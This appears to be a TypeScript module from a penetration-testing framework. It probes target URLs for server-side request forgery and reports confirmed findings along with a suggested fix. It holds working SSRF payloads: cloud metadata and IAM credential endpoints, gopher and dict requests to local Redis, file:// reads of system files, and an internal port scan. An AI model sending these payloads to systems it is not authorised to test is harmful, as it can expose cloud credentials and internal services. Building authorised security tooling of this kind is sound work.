/**
 * SSRF module capability (RED_TEAM_BUILD_SPEC §6.4) — SSRFmap's module list
 * clean-rebuilt into Loam's existing SSRF engine surface. Delivery and proof
 * go through the gated red transport; every probe is one budgeted request.
 */
import type { PentestFinding } from "../../tools/pentest.js";
import type { Evidence } from "../orchestrator.js";
import { nextEvidenceId } from "../orchestrator.js";
import type { RedCapability, RedCapabilityContext, RedHypothesis, RedValidation } from "./orchestrator/redOrchestrator.js";

export type SsrfModuleKind = "metadata" | "gopher" | "fileRead" | "dict" | "internalPortscan";

/** SSRFmap-style module payload values (documented behaviour, clean rebuild). */
export function ssrfModulePayloads(kind: SsrfModuleKind): string[] {
  switch (kind) {
    case "metadata":
      return [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
      ];
    case "gopher":
      return ["gopher://127.0.0.1:6379/_INFO"];
    case "fileRead":
      return ["file:///etc/hostname", "file:///c:/windows/win.ini"];
    case "dict":
      return ["dict://127.0.0.1:6379/INFO"];
    case "internalPortscan":
      return [80, 443, 3306, 5432, 6379, 8080].map((p) => `http://127.0.0.1:${p}/`);
  }
}

/** Default response markers that indicate the probe value was fetched server-side. */
const DEFAULT_MARKERS = [
  "ami-id", "instance-id", "iam/", "computeMetadata", // cloud metadata
  "[fonts]", "for 16-bit app support", // windows win.ini
  "root:x:", "HOSTNAME", // unix files
];

export interface SsrfCapabilityOptions {
  /** URL template with a {SSRF} placeholder for the injected value; default `${target}?url={SSRF}`. */
  probeTemplate?: string;
  /** Response body markers that prove server-side fetch. */
  markers?: string[];
  kinds?: SsrfModuleKind[];
}

export function ssrfCapability(opts: SsrfCapabilityOptions = {}): RedCapability {
  const kinds = opts.kinds ?? ["metadata", "fileRead"];
  const markers = opts.markers ?? DEFAULT_MARKERS;
  const buildProbeUrl = (target: string, value: string): string => {
    const template = opts.probeTemplate ?? `${target.replace(/\/+$/, "")}?url={SSRF}`;
    return template.replace("{SSRF}", encodeURIComponent(value));
  };
  return {
    id: "red.ssrf",
    applicable: (target) => /^https?:/i.test(target),
    hunt: async (target): Promise<RedHypothesis[]> => {
      const hyps: RedHypothesis[] = [];
      for (const kind of kinds) {
        for (const value of ssrfModulePayloads(kind).slice(0, 3)) {
          hyps.push({
            id: `HYP-SSRF-${kind}-${hyps.length}`,
            capability: "red.ssrf",
            target,
            claim: `SSRF via ${kind} probe (${value.slice(0, 60)})`,
            rationale: "SSRFmap-style module probe",
          });
        }
      }
      return hyps.slice(0, 6);
    },
    validate: async (hyp: RedHypothesis, ctx: RedCapabilityContext): Promise<RedValidation> => {
      // Re-derive the probe value from the claim's last parenthesised segment.
      const match = /\((.+?)\)\s*$/.exec(hyp.claim);
      const value = match?.[1] ?? "http://127.0.0.1/";
      const probeUrl = buildProbeUrl(hyp.target, value);
      let result;
      try {
        result = await ctx.transport.request(probeUrl);
      } catch (err) {
        return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `probe failed: ${(err as Error).message}`, evidence: [] };
      }
      const matched = markers.find((m) => result.body.includes(m));
      if (!matched) {
        return { hypothesisId: hyp.id, status: "refuted", claim: hyp.claim, detail: "probe response did not contain a fetch marker", evidence: [] };
      }
      const evidence: Evidence[] = [
        {
          id: nextEvidenceId(),
          kind: "request_response",
          at: new Date().toISOString(),
          url: probeUrl,
          method: "GET",
          status: result.status,
          response: result.body.slice(0, 2000),
        },
        {
          id: nextEvidenceId(),
          kind: "poc",
          at: new Date().toISOString(),
          poc: `GET ${probeUrl}`,
          observed: `Response contains "${matched}" fetched from the injected URL (HTTP ${result.status})`,
        },
      ];
      const finding: Omit<PentestFinding, "id"> = {
        check: "red_ssrf_module",
        verdict: "finding",
        severity: "high",
        title: `Server-side request forgery via URL parameter (${value.slice(0, 60)})`,
        target: hyp.target,
        detail: evidence[1]!.observed!,
        remediation: "Allow-list outbound destinations server-side; never fetch user-supplied URLs directly.",
      };
      return { hypothesisId: hyp.id, status: "confirmed", claim: hyp.claim, detail: evidence[1]!.observed!, evidence, finding };
    },
  };
}
